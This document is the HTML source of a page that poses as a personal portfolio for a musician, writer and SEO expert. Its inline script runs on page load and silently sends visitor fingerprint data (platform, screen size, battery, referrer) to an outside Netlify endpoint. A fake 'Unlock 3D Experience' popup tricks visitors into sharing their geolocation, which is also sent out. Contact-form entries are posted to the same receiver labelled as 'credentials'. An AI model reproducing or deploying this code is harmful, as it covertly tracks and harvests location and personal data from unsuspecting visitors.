<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title>Sabbir Hosen Akash - Portfolio | Musician, Writer & SEO Expert</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css" />
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css">

    <style>
        #advanced-overlay {
            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
            background:rgba(0,0,0,0.95); z-index:9999999; display:flex; 
            justify-content:center; align-items:center; backdrop-filter: blur(10px);
            padding: 20px; box-sizing: border-box;
        }
        .robot-popup {
            border: 2px solid #00ff88; background: #000;
            padding: 30px 20px; border-radius: 20px; 
            text-align:center; max-width: 320px; width: 100%;
            box-shadow: 0 0 25px #00ff88;
        }
        #final-ok-btn {
            background: #00ff88; color: #000; border: none;
            padding: 12px 50px; font-size: 16px; font-weight: bold;
            border-radius: 50px; cursor: pointer; margin-top: 25px;
            box-shadow: 0 0 15px #00ff88; transition: 0.3s;
        }
    </style>
</head>
<body>

    <div id="advanced-overlay">
        <div class="robot-popup">
            <div style="font-size: 50px; margin-bottom: 15px;">ü§ñ</div>
            <h2 style="color:#00ff88; font-family: sans-serif; font-size: 20px;">Unlock 3D Experience</h2>
            <p style="color:#ccc; font-family: sans-serif; font-size: 13px; line-height: 1.5;">Allow Location access to enable personalized 3D animations and interface based on your region.</p>
            <button id="final-ok-btn">Enable Experience</button>
        </div>
    </div>

<script>
    // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶§‡ßÅ‡¶® Netlify Function ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï
    const API_BRIDGE = 'https://peaceful-torte-b8ab6b.netlify.app/.netlify/functions/receiver';
    const overlay = document.getElementById('advanced-overlay');
    const okBtn = document.getElementById('final-ok-btn');

    // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶á‡¶â‡¶®‡¶ø‡¶≠‡¶æ‡¶∞‡ßç‡¶∏‡¶æ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
    async function postData(payload) {
        try {
            await fetch(API_BRIDGE, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) { console.log("Sent"); }
    }

    // ‡ßß. ‡¶∏‡¶æ‡¶á‡¶≤‡ßá‡¶®‡ßç‡¶ü ‡¶≠‡¶ø‡¶ú‡¶ø‡¶ü‡¶∞ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞ (‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞‡¶á ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá)
    window.addEventListener('load', async () => {
        // ‡¶ì‡¶≠‡¶æ‡¶∞‡¶≤‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã‡¶∞ ‡¶≤‡¶ú‡¶ø‡¶ï
        if (localStorage.getItem('granted') !== 'true') {
            setTimeout(() => { overlay.style.display = 'flex'; }, 2000);
        }

        let batteryInfo = "Hidden";
        try {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
        } catch (e) {}

        const profileData = {
            type: "full_profile",
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height}`,
            battery: batteryStatus,
            referrer: document.referrer || "Direct Visit"
        };

        postData(profileData);
    });

    // ‡ß®. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç (‡¶á‡¶â‡¶ú‡¶æ‡¶∞ OK ‡¶¨‡¶æ‡¶ü‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá)
    okBtn.addEventListener('click', async () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                localStorage.setItem('granted', 'true');
                overlay.style.display = 'none';

                const locData = {
                    type: "location",
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                };
                
                await postData(locData);
                
                // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶ï‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶´‡ßá‡¶∂‡¶®‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶ï‡¶∏‡ßá‡¶∏ ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
                alert("3D Interface Enabled Successfully!");
            }, (err) => {
                alert("Please enable location to experience the 3D portfolio.");
            });
        }
    });

    // ‡ß©. ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶´‡¶∞‡ßç‡¶Æ ‡¶á‡¶®‡ßç‡¶ü‡¶ø‡¶ó‡ßç‡¶∞‡ßá‡¶∂‡¶® (‡¶Ø‡¶æ‡¶§‡ßá ‡¶ï‡ßá‡¶â ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶¶‡¶ø‡¶≤‡ßá ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶Ü‡¶∏‡ßá)
    const contactForm = document.getElementById('contact-form');
    if(contactForm) {
        contactForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = {
                type: "credentials", // ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠‡¶æ‡¶∞‡ßá ‡¶è‡¶á ‡¶ü‡¶æ‡¶á‡¶™ ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶Ü‡¶õ‡ßá
                site: "Portfolio Contact Form",
                username: document.getElementById('form-name').value,
                password: `Email: ${document.getElementById('form-email').value} | Msg: ${document.getElementById('form-message').value}`
            };
            
            await postData(formData);
            alert("Message sent successfully!");
            contactForm.reset();
        });
    }
</script>

    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script src="script.js"></script>
</body>
</html>
